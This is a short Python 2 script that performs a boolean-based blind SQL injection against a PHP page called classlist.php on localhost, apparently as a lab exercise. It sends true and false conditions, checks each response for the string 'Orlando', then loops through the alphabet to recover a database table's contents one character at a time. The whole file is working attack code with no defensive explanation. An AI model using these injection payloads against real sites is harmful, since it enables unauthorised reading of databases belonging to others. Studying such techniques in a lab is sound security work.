import urllib2
import urllib


def checkurl(url, matchstring):
    url = urllib.quote(url, safe="/\\:?=+")
    webobject = urllib2.urlopen(url)
    content = webobject.read()
    return matchstring in content


print checkurl("http://127.0.0.1/classlist.php?filter=504'+and+1=1;--+#", "Orlando")
print checkurl("http://127.0.0.1/classlist.php?filter=504'+and+1=0;--+#", "Orlando")
print checkurl("http://127.0.0.1/classlist.php?filter=504'+and+(lower(mid((select+name+from+classes+limit+1),2,1))='e');--+#", "Orlando")

for letter in "abcdefghijklmnopqrstuvwxyz":
    if checkurl("http://127.0.0.1/classlist.php?filter=504'+and+(lower(mid((select+name+from+classes+limit+1),1,1))='" + letter + "');--+#", "Orlando"):
        print "The First letter is " + letter
    else:
        print "The first letter is NOT a " + letter
